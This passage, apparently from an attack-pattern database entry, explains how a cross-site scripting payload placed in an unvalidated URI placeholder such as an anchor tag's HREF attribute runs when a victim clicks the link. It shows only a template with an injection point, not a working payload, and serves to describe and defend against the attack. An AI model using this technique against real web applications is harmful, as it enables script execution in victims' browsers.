placeholder without a proper validation are at risk for such an attack. An adversary could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): <a href=INJECTION_POINT>My Link</a> Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.::","::83::","","",